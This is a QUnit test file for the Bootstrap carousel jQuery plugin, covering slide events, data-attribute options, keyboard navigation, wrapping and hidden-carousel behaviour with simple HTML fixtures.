$(function () {
  'use strict'

  QUnit.module('carousel plugin')

  QUnit.test('should be defined on jQuery object', function (assert) {
    assert.expect(1)
    assert.ok($(document.body).carousel, 'carousel method is defined')
  })

  QUnit.module('carousel', {
    beforeEach: function () {
      // Run all tests in noConflict mode -- it's the only way to ensure that the plugin works in noConflict mode
      $.fn.bootstrapCarousel = $.fn.carousel.noConflict()
    },
    afterEach: function () {
      $.fn.carousel = $.fn.bootstrapCarousel
      delete $.fn.bootstrapCarousel
      $('#qunit-fixture').html('')
    }
  })

  QUnit.test('should provide no conflict', function (assert) {
    assert.expect(1)
    assert.strictEqual(typeof $.fn.carousel, 'undefined', 'carousel was set back to undefined (orig value)')
  })

  QUnit.test('should throw explicit error on undefined method', function (assert) {
    assert.expect(1)
    var $el = $('<div/>')
    $el.bootstrapCarousel()
    try {
      $el.bootstrapCarousel('noMethod')
    } catch (err) {
      assert.strictEqual(err.message, 'No method named "noMethod"')
    }
  })

  QUnit.test('should return jquery collection containing the element', function (assert) {
    assert.expect(2)
    var $el = $('<div/>')
    var $carousel = $el.bootstrapCarousel()
    assert.ok($carousel instanceof $, 'returns jquery collection')
    assert.strictEqual($carousel[0], $el[0], 'collection contains element')
  })

  QUnit.test('should type check config options', function (assert) {
    assert.expect(2)

    var message
    var expectedMessage = 'CAROUSEL: Option "interval" provided type "string" but expected type "(number|boolean)".'
    var config = {
      interval: 'fat sux'
    }

    try {
      $('<div/>').bootstrapCarousel(config)
    } catch (err) {
      message = err.message
    }

    assert.ok(message === expectedMessage, 'correct error message')

    config = {
      keyboard: document.createElement('div')
    }
    expectedMessage = 'CAROUSEL: Option "keyboard" provided type "element" but expected type "boolean".'

    try {
      $('<div/>').bootstrapCarousel(config)
    } catch (err) {
      message = err.message
    }

    assert.ok(message === expectedMessage, 'correct error message')
  })

  QUnit.test('should not fire slid when slide is prevented', function (assert) {
    assert.expect(1)
    var done = assert.async()
    $('<div class="carousel"/>')
      .on('slide.bs.carousel', function (e) {
        e.preventDefault()
        assert.ok(true, 'slide event fired')
        done()
      })
      .on('slid.bs.carousel', function () {
        assert.ok(false, 'slid event fired')
      })
      .bootstrapCarousel('next')
  })

  QUnit.test('should reset when slide is prevented', function (assert) {
    assert.expect(6)
    var carouselHTML = '<div id="carousel-example-generic" class="carousel slide">' +
        '<ol class="carousel-indicators">' +
        '<li data-target="#carousel-example-generic" data-slide-to="0" class="active"/>' +
        '<li data-target="#carousel-example-generic" data-slide-to="1"/>' +
        '<li data-target="#carousel-example-generic" data-slide-to="2"/>' +
        '</ol>' +
        '<div class="carousel-inner">' +
        '<div class="carousel-item active">' +
        '<div class="carousel-caption"/>' +
        '</div>' +
        '<div class="carousel-item">' +
        '<div class="carousel-caption"/>' +
        '</div>' +
        '<div class="carousel-item">' +
        '<div class="carousel-caption"/>' +
        '</div>' +
        '</div>' +
        '<a class="left carousel-control" href="#carousel-example-generic" data-slide="prev"/>' +
        '<a class="right carousel-control" href="#carousel-example-generic" data-slide="next"/>' +
        '</div>'
    var $carousel = $(carouselHTML)

    var done = assert.async()
    $carousel
      .one('slide.bs.carousel', function (e) {
        e.preventDefault()
        setTimeout(function () {
          assert.ok($carousel.find('.carousel-item:nth-child(1)').is('.active'), 'first item still active')
          assert.ok($carousel.find('.carousel-indicators li:nth-child(1)').is('.active'), 'first indicator still active')
          $carousel.bootstrapCarousel('next')
        }, 0)
      })
      .one('slid.bs.carousel', function () {
        setTimeout(function () {
          assert.ok(!$carousel.find('.carousel-item:nth-child(1)').is('.active'), 'first item still active')
          assert.ok(!$carousel.find('.carousel-indicators li:nth-child(1)').is('.active'), 'first indicator still active')
          assert.ok($carousel.find('.carousel-item:nth-child(2)').is('.active'), 'second item active')
          assert.ok($carousel.find('.carousel-indicators li:nth-child(2)').is('.active'), 'second indicator active')
          done()
        }, 0)
      })
      .bootstrapCarousel('next')
  })

  QUnit.test('should fire slide event with direction', function (assert) {
    assert.expect(4)
    var carouselHTML = '<div id="myCarousel" class="carousel slide">' +
        '<div class="carousel-inner">' +
        '<div class="carousel-item active">' +
        '<img alt="">' +
        '<div class="carousel-caption">' +
        '<h4>First Thumbnail label</h4>' +
        '<p>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec ' +
        'id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ' +
        'ultricies vehicula ut id elit.</p>' +
        '</div>' +
        '</div>' +
        '<div class="carousel-item">' +
        '<img alt="">' +
        '<div class="carousel-caption">' +
        '<h4>Second Thumbnail label</h4>' +
        '<p>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec ' +
        'id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ' +
        'ultricies vehicula ut id elit.</p>' +
        '</div>' +
        '</div>' +
        '<div class="carousel-item">' +
        '<img alt="">' +
        '<div class="carousel-caption">' +
        '<h4>Third Thumbnail label</h4>' +
        '<p>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec ' +
        'id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ' +
        'ultricies vehicula ut id elit.</p>' +
        '</div>' +
        '</div>' +
        '</div>' +
        '<a class="left carousel-control" href="#myCarousel" data-slide="prev">&lsaquo;</a>' +
        '<a class="right carousel-control" href="#myCarousel" data-slide="next">&rsaquo;</a>' +
        '</div>'
    var $carousel = $(carouselHTML)

    var done = assert.async()

    $carousel
      .one('slide.bs.carousel', function (e) {
        assert.ok(e.direction, 'direction present on next')
        assert.strictEqual(e.direction, 'left', 'direction is left on next')

        $carousel
          .one('slide.bs.carousel', function (e) {
            assert.ok(e.direction, 'direction present on prev')
            assert.strictEqual(e.direction, 'right', 'direction is right on prev')
            done()
          })
          .bootstrapCarousel('prev')
      })
      .bootstrapCarousel('next')
  })

  QUnit.test('should fire slid event with direction', function (assert) {
    assert.expect(4)
    var carouselHTML = '<div id="myCarousel" class="carousel slide">' +
        '<div class="carousel-inner">' +
        '<div class="carousel-item active">' +
        '<img alt="">' +
        '<div class="carousel-caption">' +
        '<h4>First Thumbnail label</h4>' +
        '<p>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec ' +
        'id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ' +
        'ultricies vehicula ut id elit.</p>' +
        '</div>' +
        '</div>' +
        '<div class="carousel-item">' +
        '<img alt="">' +
        '<div class="carousel-caption">' +
        '<h4>Second Thumbnail label</h4>' +
        '<p>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec ' +
        'id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ' +
        'ultricies vehicula ut id elit.</p>' +
        '</div>' +
        '</div>' +
        '<div class="carousel-item">' +
        '<img alt="">' +
        '<div class="carousel-caption">' +
        '<h4>Third Thumbnail label</h4>' +
        '<p>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec ' +
        'id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ' +
        'ultricies vehicula ut id elit.</p>' +
        '</div>' +
        '</div>' +
        '</div>' +
        '<a class="left carousel-control" href="#myCarousel" data-slide="prev">&lsaquo;</a>' +
        '<a class="right carousel-control" href="#myCarousel" data-slide="next">&rsaquo;</a>' +
        '</div>'
    var $carousel = $(carouselHTML)

    var done = assert.async()

    $carousel
      .one('slid.bs.carousel', function (e) {
        assert.ok(e.direction, 'direction present on next')
        assert.strictEqual(e.direction, 'left', 'direction is left on next')

        $carousel
          .one('slid.bs.carousel', function (e) {
            assert.ok(e.direction, 'direction present on prev')
            assert.strictEqual(e.direction, 'right', 'direction is right on prev')
            done()
          })
          .bootstrapCarousel('prev')
      })
      .bootstrapCarousel('next')
  })

  QUnit.test('should fire slide event with relatedTarget', function (assert) {
    assert.expect(2)
    var template = '<div id="myCarousel" class="carousel slide">' +
        '<div class="carousel-inner">' +
        '<div class="carousel-item active">' +
        '<img alt="">' +
        '<div class="carousel-caption">' +
        '<h4>First Thumbnail label</h4>' +
        '<p>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec ' +
        'id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ' +
        'ultricies vehicula ut id elit.</p>' +
        '</div>' +
        '</div>' +
        '<div class="carousel-item">' +
        '<img alt="">' +
        '<div class="carousel-caption">' +
        '<h4>Second Thumbnail label</h4>' +
        '<p>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec ' +
        'id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ' +
        'ultricies vehicula ut id elit.</p>' +
        '</div>' +
        '</div>' +
        '<div class="carousel-item">' +
        '<img alt="">' +
        '<div class="carousel-caption">' +
        '<h4>Third Thumbnail label</h4>' +
        '<p>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec ' +
        'id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ' +
        'ultricies vehicula ut id elit.</p>' +
        '</div>' +
        '</div>' +
        '</div>' +
        '<a class="left carousel-control" href="#myCarousel" data-slide="prev">&lsaquo;</a>' +
        '<a class="right carousel-control" href="#myCarousel" data-slide="next">&rsaquo;</a>' +
        '</div>'

    var done = assert.async()

    $(template)
      .on('slide.bs.carousel', function (e) {
        assert.ok(e.relatedTarget, 'relatedTarget present')
        assert.ok($(e.relatedTarget).hasClass('carousel-item'), 'relatedTarget has class "item"')
        done()
      })
      .bootstrapCarousel('next')
  })

  QUnit.test('should fire slid event with relatedTarget', function (assert) {
    assert.expect(2)
    var template = '<div id="myCarousel" class="carousel slide">' +
        '<div class="carousel-inner">' +
        '<div class="carousel-item active">' +
        '<img alt="">' +
        '<div class="carousel-caption">' +
        '<h4>First Thumbnail label</h4>' +
        '<p>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec ' +
        'id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ' +
        'ultricies vehicula ut id elit.</p>' +
        '</div>' +
        '</div>' +
        '<div class="carousel-item">' +
        '<img alt="">' +
        '<div class="carousel-caption">' +
        '<h4>Second Thumbnail label</h4>' +
        '<p>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec ' +
        'id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ' +
        'ultricies vehicula ut id elit.</p>' +
        '</div>' +
        '</div>' +
        '<div class="carousel-item">' +
        '<img alt="">' +
        '<div class="carousel-caption">' +
        '<h4>Third Thumbnail label</h4>' +
        '<p>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec ' +
        'id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ' +
        'ultricies vehicula ut id elit.</p>' +
        '</div>' +
        '</div>' +
        '</div>' +
        '<a class="left carousel-control" href="#myCarousel" data-slide="prev">&lsaquo;</a>' +
        '<a class="right carousel-control" href="#myCarousel" data-slide="next">&rsaquo;</a>' +
        '</div>'

    var done = assert.async()

    $(template)
      .on('slid.bs.carousel', function (e) {
        assert.ok(e.relatedTarget, 'relatedTarget present')
        assert.ok($(e.relatedTarget).hasClass('carousel-item'), 'relatedTarget has class "item"')
        done()
      })
      .bootstrapCarousel('next')
  })

  QUnit.test('should fire slid and slide events with from and to', function (assert) {
    assert.expect(4)
    var template = '<div id="myCarousel" class="carousel slide">' +
        '<div class="carousel-inner">' +
        '<div class="carousel-item active">' +
        '<img alt="">' +
        '<div class="carousel-caption">' +
        '<h4>First Thumbnail label</h4>' +
        '</div>' +
        '</div>' +
        '<div class="carousel-item">' +
        '<img alt="">' +
        '<div class="carousel-caption">' +
        '<h4>Second Thumbnail label</h4>' +
        '</div>' +
        '</div>' +
        '<div class="carousel-item">' +
        '<img alt="">' +
        '<div class="carousel-caption">' +
        '<h4>Third Thumbnail label</h4>' +
        '</div>' +
        '</div>' +
        '</div>' +
        '<a class="left carousel-control" href="#myCarousel" data-slide="prev">&lsaquo;</a>' +
        '<a class="right carousel-control" href="#myCarousel" data-slide="next">&rsaquo;</a>' +
        '</div>'

    var done = assert.async()
    $(template)
      .on('slid.bs.carousel', function (e) {
        assert.ok(typeof e.from !== 'undefined', 'from present')
        assert.ok(typeof e.to !== 'undefined', 'to present')
        $(this).off()
        done()
      })
      .on('slide.bs.carousel', function (e) {
        assert.ok(typeof e.from !== 'undefined', 'from present')
        assert.ok(typeof e.to !== 'undefined', 'to present')
        $(this).off('slide.bs.carousel')
      })
      .bootstrapCarousel('next')
  })

  QUnit.test('should set interval from data attribute', function (assert) {
    assert.expect(4)
    var templateHTML = '<div id="myCarousel" class="carousel slide">' +
        '<div class="carousel-inner">' +
        '<div class="carousel-item active">' +
        '<img alt="">' +
        '<div class="carousel-caption">' +
        '<h4>First Thumbnail label</h4>' +
        '<p>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec ' +
        'id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ' +
        'ultricies vehicula ut id elit.</p>' +
        '</div>' +
        '</div>' +
        '<div class="carousel-item">' +
        '<img alt="">' +
        '<div class="carousel-caption">' +
        '<h4>Second Thumbnail label</h4>' +
        '<p>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec ' +
        'id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ' +
        'ultricies vehicula ut id elit.</p>' +
        '</div>' +
        '</div>' +
        '<div class="carousel-item">' +
        '<img alt="">' +
        '<div class="carousel-caption">' +
        '<h4>Third Thumbnail label</h4>' +
        '<p>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec ' +
        'id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ' +
        'ultricies vehicula ut id elit.</p>' +
        '</div>' +
        '</div>' +
        '</div>' +
        '<a class="left carousel-control" href="#myCarousel" data-slide="prev">&lsaquo;</a>' +
        '<a class="right carousel-control" href="#myCarousel" data-slide="next">&rsaquo;</a>' +
        '</div>'
    var $carousel = $(templateHTML)
    $carousel.attr('data-interval', 1814)

    $carousel.appendTo('body')
    $('[data-slide]').first().trigger('click')
    assert.strictEqual($carousel.data('bs.carousel')._config.interval, 1814)
    $carousel.remove()

    $carousel.appendTo('body').attr('data-modal', 'foobar')
    $('[data-slide]').first().trigger('click')
    assert.strictEqual($carousel.data('bs.carousel')._config.interval, 1814, 'even if there is an data-modal attribute set')
    $carousel.remove()

    $carousel.appendTo('body')
    $('[data-slide]').first().trigger('click')
    $carousel.attr('data-interval', 1860)
    $('[data-slide]').first().trigger('click')
    assert.strictEqual($carousel.data('bs.carousel')._config.interval, 1814, 'attributes should be read only on initialization')
    $carousel.remove()

    $carousel.attr('data-interval', false)
    $carousel.appendTo('body')
    $carousel.bootstrapCarousel(1)
    assert.strictEqual($carousel.data('bs.carousel')._config.interval, false, 'data attribute has higher priority than default options')
    $carousel.remove()
  })

  QUnit.test('should skip over non-items when using item indices', function (assert) {
    assert.expect(2)
    var templateHTML = '<div id="myCarousel" class="carousel" data-interval="1814">' +
        '<div class="carousel-inner">' +
        '<div class="carousel-item active">' +
        '<img alt="">' +
        '</div>' +
        '<script type="text/x-metamorph" id="thingy"/>' +
        '<div class="carousel-item">' +
        '<img alt="">' +
        '</div>' +
        '<div class="carousel-item">' +
        '</div>' +
        '</div>' +
        '</div>'
    var $template = $(templateHTML)

    $template.bootstrapCarousel()

    assert.strictEqual($template.find('.carousel-item')[0], $template.find('.active')[0], 'first item active')

    $template.bootstrapCarousel(1)

    assert.strictEqual($template.find('.carousel-item')[1], $template.find('.active')[0], 'second item active')
  })

  QUnit.test('should skip over non-items when using next/prev methods', function (assert) {
    assert.expect(2)
    var templateHTML = '<div id="myCarousel" class="carousel" data-interval="1814">' +
        '<div class="carousel-inner">' +
        '<div class="carousel-item active">' +
        '<img alt="">' +
        '</div>' +
        '<script type="text/x-metamorph" id="thingy"/>' +
        '<div class="carousel-item">' +
        '<img alt="">' +
        '</div>' +
        '<div class="carousel-item">' +
        '</div>' +
        '</div>' +
        '</div>'
    var $template = $(templateHTML)

    $template.bootstrapCarousel()

    assert.strictEqual($template.find('.carousel-item')[0], $template.find('.active')[0], 'first item active')

    $template.bootstrapCarousel('next')

    assert.strictEqual($template.find('.carousel-item')[1], $template.find('.active')[0], 'second item active')
  })

  QUnit.test('should go to previous item if left arrow key is pressed', function (assert) {
    assert.expect(2)
    var templateHTML = '<div id="myCarousel" class="carousel" data-interval="false">' +
        '<div class="carousel-inner">' +
        '<div id="first" class="carousel-item">' +
        '<img alt="">' +
        '</div>' +
        '<div id="second" class="carousel-item active">' +
        '<img alt="">' +
        '</div>' +
        '<div id="third" class="carousel-item">' +
        '<img alt="">' +
        '</div>' +
        '</div>' +
        '</div>'
    var $template = $(templateHTML)

    $template.bootstrapCarousel()

    assert.strictEqual($template.find('.carousel-item')[1], $template.find('.active')[0], 'second item active')

    $template.trigger($.Event('keydown', {
      which: 37
    }))

    assert.strictEqual($template.find('.carousel-item')[0], $template.find('.active')[0], 'first item active')
  })

  QUnit.test('should go to next item if right arrow key is pressed', function (assert) {
    assert.expect(2)
    var templateHTML = '<div id="myCarousel" class="carousel" data-interval="false">' +
        '<div class="carousel-inner">' +
        '<div id="first" class="carousel-item active">' +
        '<img alt="">' +
        '</div>' +
        '<div id="second" class="carousel-item">' +
        '<img alt="">' +
        '</div>' +
        '<div id="third" class="carousel-item">' +
        '<img alt="">' +
        '</div>' +
        '</div>' +
        '</div>'
    var $template = $(templateHTML)

    $template.bootstrapCarousel()

    assert.strictEqual($template.find('.carousel-item')[0], $template.find('.active')[0], 'first item active')

    $template.trigger($.Event('keydown', {
      which: 39
    }))

    assert.strictEqual($template.find('.carousel-item')[1], $template.find('.active')[0], 'second item active')
  })

  QUnit.test('should not prevent keydown if key is not ARROW_LEFT or ARROW_RIGHT', function (assert) {
    assert.expect(2)
    var templateHTML = '<div id="myCarousel" class="carousel" data-interval="false">' +
        '<div class="carousel-inner">' +
        '<div id="first" class="carousel-item active">' +
        '<img alt="">' +
        '</div>' +
        '</div>' +
        '</div>'
    var $template = $(templateHTML)

    $template.bootstrapCarousel()
    var done = assert.async()

    var eventArrowDown = $.Event('keydown', {
      which: 40
    })
    var eventArrowUp   = $.Event('keydown', {
      which: 38
    })

    $template.one('keydown', function (event) {
      assert.strictEqual(event.isDefaultPrevented(), false)
    })

    $template.trigger(eventArrowDown)

    $template.one('keydown', function (event) {
      assert.strictEqual(event.isDefaultPrevented(), false)
      done()
    })

    $template.trigger(eventArrowUp)
  })

  QUnit.test('should support disabling the keyboard navigation', function (assert) {
    assert.expect(3)
    var templateHTML = '<div id="myCarousel" class="carousel" data-interval="false" data-keyboard="false">' +
        '<div class="carousel-inner">' +
        '<div id="first" class="carousel-item active">' +
        '<img alt="">' +
        '</div>' +
        '<div id="second" class="carousel-item">' +
        '<img alt="">' +
        '</div>' +
        '<div id="third" class="carousel-item">' +
        '<img alt="">' +
        '</div>' +
        '</div>' +
        '</div>'
    var $template = $(templateHTML)

    $template.bootstrapCarousel()

    assert.strictEqual($template.find('.carousel-item')[0], $template.find('.active')[0], 'first item active')

    $template.trigger($.Event('keydown', {
      which: 39
    }))

    assert.strictEqual($template.find('.carousel-item')[0], $template.find('.active')[0], 'first item still active after right arrow press')

    $template.trigger($.Event('keydown', {
      which: 37
    }))

    assert.strictEqual($template.find('.carousel-item')[0], $template.find('.active')[0], 'first item still active after left arrow press')
  })

  QUnit.test('should ignore keyboard events within <input>s and <textarea>s', function (assert) {
    assert.expect(7)
    var templateHTML = '<div id="myCarousel" class="carousel" data-interval="false">' +
        '<div class="carousel-inner">' +
        '<div id="first" class="carousel-item active">' +
        '<img alt="">' +
        '<input type="text" id="in-put">' +
        '<textarea id="text-area"></textarea>' +
        '</div>' +
        '<div id="second" class="carousel-item">' +
        '<img alt="">' +
        '</div>' +
        '<div id="third" class="carousel-item">' +
        '<img alt="">' +
        '</div>' +
        '</div>' +
        '</div>'
    var $template = $(templateHTML)
    var $input = $template.find('#in-put')
    var $textarea = $template.find('#text-area')

    assert.strictEqual($input.length, 1, 'found <input>')
    assert.strictEqual($textarea.length, 1, 'found <textarea>')

    $template.bootstrapCarousel()

    assert.strictEqual($template.find('.carousel-item')[0], $template.find('.active')[0], 'first item active')

    $input.trigger($.Event('keydown', {
      which: 39
    }))
    assert.strictEqual($template.find('.carousel-item')[0], $template.find('.active')[0], 'first item still active after right arrow press in <input>')

    $input.trigger($.Event('keydown', {
      which: 37
    }))
    assert.strictEqual($template.find('.carousel-item')[0], $template.find('.active')[0], 'first item still active after left arrow press in <input>')

    $textarea.trigger($.Event('keydown', {
      which: 39
    }))
    assert.strictEqual($template.find('.carousel-item')[0], $template.find('.active')[0], 'first item still active after right arrow press in <textarea>')

    $textarea.trigger($.Event('keydown', {
      which: 37
    }))
    assert.strictEqual($template.find('.carousel-item')[0], $template.find('.active')[0], 'first item still active after left arrow press in <textarea>')
  })

  QUnit.test('should wrap around from end to start when wrap option is true', function (assert) {
    assert.expect(3)
    var carouselHTML = '<div id="carousel-example-generic" class="carousel slide" data-wrap="true">' +
        '<ol class="carousel-indicators">' +
        '<li data-target="#carousel-example-generic" data-slide-to="0" class="active"/>' +
        '<li data-target="#carousel-example-generic" data-slide-to="1"/>' +
        '<li data-target="#carousel-example-generic" data-slide-to="2"/>' +
        '</ol>' +
        '<div class="carousel-inner">' +
        '<div class="carousel-item active" id="one">' +
        '<div class="carousel-caption"/>' +
        '</div>' +
        '<div class="carousel-item" id="two">' +
        '<div class="carousel-caption"/>' +
        '</div>' +
        '<div class="carousel-item" id="three">' +
        '<div class="carousel-caption"/>' +
        '</div>' +
        '</div>' +
        '<a class="left carousel-control" href="#carousel-example-generic" data-slide="prev"/>' +
        '<a class="right carousel-control" href="#carousel-example-generic" data-slide="next"/>' +
        '</div>'
    var $carousel = $(carouselHTML)
    var getActiveId = function () {
      return $carousel.find('.carousel-item.active').attr('id')
    }

    var done = assert.async()

    $carousel
      .one('slid.bs.carousel', function () {
        assert.strictEqual(getActiveId(), 'two', 'carousel slid from 1st to 2nd slide')
        $carousel
          .one('slid.bs.carousel', function () {
            assert.strictEqual(getActiveId(), 'three', 'carousel slid from 2nd to 3rd slide')
            $carousel
              .one('slid.bs.carousel', function () {
                assert.strictEqual(getActiveId(), 'one', 'carousel wrapped around and slid from 3rd to 1st slide')
                done()
              })
              .bootstrapCarousel('next')
          })
          .bootstrapCarousel('next')
      })
      .bootstrapCarousel('next')
  })

  QUnit.test('should wrap around from start to end when wrap option is true', function (assert) {
    assert.expect(1)
    var carouselHTML = '<div id="carousel-example-generic" class="carousel slide" data-wrap="true">' +
        '<ol class="carousel-indicators">' +
        '<li data-target="#carousel-example-generic" data-slide-to="0" class="active"/>' +
        '<li data-target="#carousel-example-generic" data-slide-to="1"/>' +
        '<li data-target="#carousel-example-generic" data-slide-to="2"/>' +
        '</ol>' +
        '<div class="carousel-inner">' +
        '<div class="carousel-item active" id="one">' +
        '<div class="carousel-caption"/>' +
        '</div>' +
        '<div class="carousel-item" id="two">' +
        '<div class="carousel-caption"/>' +
        '</div>' +
        '<div class="carousel-item" id="three">' +
        '<div class="carousel-caption"/>' +
        '</div>' +
        '</div>' +
        '<a class="left carousel-control" href="#carousel-example-generic" data-slide="prev"/>' +
        '<a class="right carousel-control" href="#carousel-example-generic" data-slide="next"/>' +
        '</div>'
    var $carousel = $(carouselHTML)

    var done = assert.async()

    $carousel
      .on('slid.bs.carousel', function () {
        assert.strictEqual($carousel.find('.carousel-item.active').attr('id'), 'three', 'carousel wrapped around and slid from 1st to 3rd slide')
        done()
      })
      .bootstrapCarousel('prev')
  })

  QUnit.test('should stay at the end when the next method is called and wrap is false', function (assert) {
    assert.expect(3)
    var carouselHTML = '<div id="carousel-example-generic" class="carousel slide" data-wrap="false">' +
        '<ol class="carousel-indicators">' +
        '<li data-target="#carousel-example-generic" data-slide-to="0" class="active"/>' +
        '<li data-target="#carousel-example-generic" data-slide-to="1"/>' +
        '<li data-target="#carousel-example-generic" data-slide-to="2"/>' +
        '</ol>' +
        '<div class="carousel-inner">' +
        '<div class="carousel-item active" id="one">' +
        '<div class="carousel-caption"/>' +
        '</div>' +
        '<div class="carousel-item" id="two">' +
        '<div class="carousel-caption"/>' +
        '</div>' +
        '<div class="carousel-item" id="three">' +
        '<div class="carousel-caption"/>' +
        '</div>' +
        '</div>' +
        '<a class="left carousel-control" href="#carousel-example-generic" data-slide="prev"/>' +
        '<a class="right carousel-control" href="#carousel-example-generic" data-slide="next"/>' +
        '</div>'
    var $carousel = $(carouselHTML)
    var getActiveId = function () {
      return $carousel.find('.carousel-item.active').attr('id')
    }

    var done = assert.async()

    $carousel
      .one('slid.bs.carousel', function () {
        assert.strictEqual(getActiveId(), 'two', 'carousel slid from 1st to 2nd slide')
        $carousel
          .one('slid.bs.carousel', function () {
            assert.strictEqual(getActiveId(), 'three', 'carousel slid from 2nd to 3rd slide')
            $carousel
              .one('slid.bs.carousel', function () {
                assert.ok(false, 'carousel slid when it should not have slid')
              })
              .bootstrapCarousel('next')
            assert.strictEqual(getActiveId(), 'three', 'carousel did not wrap around and stayed on 3rd slide')
            done()
          })
          .bootstrapCarousel('next')
      })
      .bootstrapCarousel('next')
  })

  QUnit.test('should stay at the start when the prev method is called and wrap is false', function (assert) {
    assert.expect(1)
    var carouselHTML = '<div id="carousel-example-generic" class="carousel slide" data-wrap="false">' +
        '<ol class="carousel-indicators">' +
        '<li data-target="#carousel-example-generic" data-slide-to="0" class="active"/>' +
        '<li data-target="#carousel-example-generic" data-slide-to="1"/>' +
        '<li data-target="#carousel-example-generic" data-slide-to="2"/>' +
        '</ol>' +
        '<div class="carousel-inner">' +
        '<div class="carousel-item active" id="one">' +
        '<div class="carousel-caption"/>' +
        '</div>' +
        '<div class="carousel-item" id="two">' +
        '<div class="carousel-caption"/>' +
        '</div>' +
        '<div class="carousel-item" id="three">' +
        '<div class="carousel-caption"/>' +
        '</div>' +
        '</div>' +
        '<a class="left carousel-control" href="#carousel-example-generic" data-slide="prev"/>' +
        '<a class="right carousel-control" href="#carousel-example-generic" data-slide="next"/>' +
        '</div>'
    var $carousel = $(carouselHTML)

    $carousel
      .on('slid.bs.carousel', function () {
        assert.ok(false, 'carousel slid when it should not have slid')
      })
      .bootstrapCarousel('prev')
    assert.strictEqual($carousel.find('.carousel-item.active').attr('id'), 'one', 'carousel did not wrap around and stayed on 1st slide')
  })

  QUnit.test('should not prevent keydown for inputs and textareas', function (assert) {
    assert.expect(2)
    var templateHTML = '<div id="myCarousel" class="carousel" data-interval="false">' +
        '<div class="carousel-inner">' +
          '<div id="first" class="carousel-item">' +
            '<input type="text" id="inputText" />' +
          '</div>' +
          '<div id="second" class="carousel-item active">' +
            '<textarea id="txtArea"></textarea>' +
          '</div>' +
        '</div>' +
        '</div>'
    var $template = $(templateHTML)
    var done = assert.async()
    $template.appendTo('#qunit-fixture')
    var $inputText = $template.find('#inputText')
    var $textArea = $template.find('#txtArea')
    $template.bootstrapCarousel()

    var eventKeyDown = $.Event('keydown', {
      which: 65
    }) // 65 for "a"
    $inputText.on('keydown', function (event) {
      assert.strictEqual(event.isDefaultPrevented(), false)
    })
    $inputText.trigger(eventKeyDown)

    $textArea.on('keydown', function (event) {
      assert.strictEqual(event.isDefaultPrevented(), false)
      done()
    })
    $textArea.trigger(eventKeyDown)
  })

  QUnit.test('Should not go to the next item when the carousel is not visible', function (assert) {
    assert.expect(2)
    var done = assert.async()
    var html = '<div id="myCarousel" class="carousel slide" data-interval="50" style="display: none;">' +
             '  <div class="carousel-inner">' +
             '    <div id="firstItem" class="carousel-item active">' +
             '      <img alt="">' +
             '    </div>' +
             '    <div class="carousel-item">' +
             '      <img alt="">' +
             '    </div>' +
             '    <div class="carousel-item">' +
             '      <img alt="">' +
             '    </div>' +
             '  <a class="left carousel-control" href="#myCarousel" data-slide="prev">&lsaquo;</a>' +
             '  <a class="right carousel-control" href="#myCarousel" data-slide="next">&rsaquo;</a>' +
             '</div>'
    var $html = $(html)
    $html
      .appendTo('#qunit-fixture')
      .bootstrapCarousel()

    var $firstItem = $('#firstItem')
    setTimeout(function () {
      assert.ok($firstItem.hasClass('active'))
      $html
        .bootstrapCarousel('dispose')
        .attr('style', 'visibility: hidden;')
        .bootstrapCarousel()

      setTimeout(function () {
        assert.ok($firstItem.hasClass('active'))
        done()
      }, 80)
    }, 80)
  })

  QUnit.test('Should not go to the next item when the parent of the carousel is not visible', function (assert) {
    assert.expect(2)
    var done = assert.async()
    var html = '<div id="parent" style="display: none;">' +
             '  <div id="myCarousel" class="carousel slide" data-interval="50" style="display: none;">' +
             '    <div class="carousel-inner">' +
             '      <div id="firstItem" class="carousel-item active">' +
             '        <img alt="">' +
             '      </div>' +
             '      <div class="carousel-item">' +
             '        <img alt="">' +
             '      </div>' +
             '      <div class="carousel-item">' +
             '        <img alt="">' +
             '      </div>' +
             '    <a class="left carousel-control" href="#myCarousel" data-slide="prev">&lsaquo;</a>' +
             '    <a class="right carousel-control" href="#myCarousel" data-slide="next">&rsaquo;</a>' +
             '  </div>' +
             '</div>'
    var $html = $(html)
    $html.appendTo('#qunit-fixture')
    var $parent = $html.find('#parent')
    var $carousel = $html.find('#myCarousel')
    $carousel.bootstrapCarousel()
    var $firstItem = $('#firstItem')

    setTimeout(function () {
      assert.ok($firstItem.hasClass('active'))
      $carousel.bootstrapCarousel('dispose')
      $parent.attr('style', 'visibility: hidden;')
      $carousel.bootstrapCarousel()

      setTimeout(function () {
        assert.ok($firstItem.hasClass('active'))
        done()
      }, 80)
    }, 80)
  })
})
